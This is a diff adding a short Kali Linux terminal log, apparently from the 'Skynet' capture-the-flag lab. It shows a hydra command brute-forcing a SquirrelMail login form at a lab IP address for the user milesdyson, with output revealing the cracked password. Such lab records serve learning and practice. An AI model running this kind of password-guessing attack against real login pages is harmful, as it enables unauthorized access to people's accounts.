@@ -1,0 +1,12 @@
+                                                                                                         
+┌──(kali㉿kali)-[~/Documents/skynet/nmap]
+└─$ hydra -l milesdyson -P log1.txt 10.10.67.107 http-form-post "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect." 
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-22 18:17:21
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
+[DATA] attacking http-post-form://10.10.67.107:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.
+[80][http-post-form] host: 10.10.67.107   login: milesdyson   password: cyborg007haloterminator
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-22 18:17:32
+
